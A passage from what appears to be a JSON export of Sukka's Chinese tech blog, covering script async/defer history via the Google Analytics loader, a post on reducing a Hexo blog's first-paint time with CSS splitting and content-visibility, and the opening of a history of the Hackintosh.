Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 